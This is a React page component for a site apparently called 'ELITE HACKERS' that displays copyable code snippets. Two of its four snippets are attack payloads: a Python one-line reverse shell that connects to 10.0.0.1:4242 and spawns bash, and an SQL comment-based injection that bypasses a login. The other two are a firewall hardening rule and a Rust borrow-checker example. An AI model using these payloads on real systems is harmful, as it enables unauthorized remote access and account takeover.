import React, { useState } from 'react';
import { motion } from 'framer-motion';
import { Helmet } from 'react-helmet-async';
import { Copy, Terminal, Code, Cpu, Hash, Monitor, Check } from 'lucide-react';
import toast from 'react-hot-toast';

const SNIPPETS = [
  {
    title: "Python Reverse Shell",
    lang: "python",
    code: `import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")`,
    desc: "Single-line Python payload for initiating a socket-based reverse shell connection."
  },
  {
    title: "Bash Firewall Hardening",
    lang: "bash",
    code: `iptables -P INPUT DROP && iptables -P FORWARD DROP && iptables -P OUTPUT ACCEPT && iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT && iptables -A INPUT -p tcp --dport 22 -j ACCEPT`,
    desc: "Strict IPTables configuration that drops all incoming traffic except for SSH and established connections."
  },
  {
    title: "Rust Memory Management",
    lang: "rust",
    code: `fn main() {
    let mut data = vec![1, 2, 3];
    let reference = &data[0];
    // data.push(4); // Error: cannot borrow as mutable because it is also borrowed as immutable
    println!("{}", reference);
}`,
    desc: "Demonstration of Rust's borrow checker preventing pointer invalidation errors."
  },
  {
    title: "SQL Injection Bypass",
    lang: "sql",
    code: `SELECT * FROM users WHERE username = 'admin' --' AND password = 'password'`,
    desc: "Basic SQL comment-based bypass technique to skip password validation logic."
  }
];

const Snippets = () => {
  const [copiedIndex, setCopiedIndex] = useState(null);

  const handleCopy = (code, idx) => {
    navigator.clipboard.writeText(code);
    setCopiedIndex(idx);
    toast.success('DECRYPTED & COPIED');
    setTimeout(() => setCopiedIndex(null), 2000);
  };

  return (
    <div className="space-y-12 animate-fade-in-up">
      <Helmet><title>Code Snippets — ELITE HACKERS</title></Helmet>

      <div>
        <h1 className="font-display font-bold text-4xl text-primary tracking-widest uppercase mb-4">
          CODE <span className="text-gold glow-gold">SNIPPETS</span>
        </h1>
        <p className="font-body text-secondary max-w-2xl text-lg">
          Ready-to-deploy payloads and architectural patterns. For ethical testing and education.
        </p>
      </div>

      <div className="grid grid-cols-1 xl:grid-cols-2 gap-8">
        {SNIPPETS.map((snip, idx) => (
          <motion.div 
            key={idx}
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ delay: idx * 0.1 }}
            className="bg-bg-card border border-border rounded-2xl overflow-hidden group hover:border-gold/50 transition-all"
          >
            <div className="bg-[var(--bg-primary)] border-b border-border py-4 px-6 flex justify-between items-center">
              <div className="flex items-center gap-3">
                <Terminal size={16} className="text-gold" />
                <span className="font-display font-bold text-xs tracking-widest uppercase">{snip.title}</span>
              </div>
              <span className="font-mono text-[9px] text-muted border border-border px-2 py-0.5 rounded uppercase">
                .{snip.lang}
              </span>
            </div>

            <div className="p-6">
              <p className="font-body text-sm text-secondary mb-6 leading-relaxed">
                {snip.desc}
              </p>
              
              <div className="relative group/code">
                <pre className="bg-[#020409] p-6 rounded-xl border border-border font-mono text-sm text-primary overflow-x-auto hide-scrollbar whitespace-pre-wrap break-all pr-12 ring-inset group-hover/code:ring-1 ring-gold/30 transition-all">
                  <code>{snip.code}</code>
                </pre>
                
                <button 
                  onClick={() => handleCopy(snip.code, idx)}
                  className="absolute right-4 top-4 p-2 bg-[var(--border)] border border-border rounded-lg text-muted hover:text-gold hover:border-gold transition-all"
                >
                  {copiedIndex === idx ? <Check size={16} className="text-primary" /> : <Copy size={16} />}
                </button>
              </div>
            </div>
          </motion.div>
        ))}
      </div>
    </div>
  );
};

export default Snippets;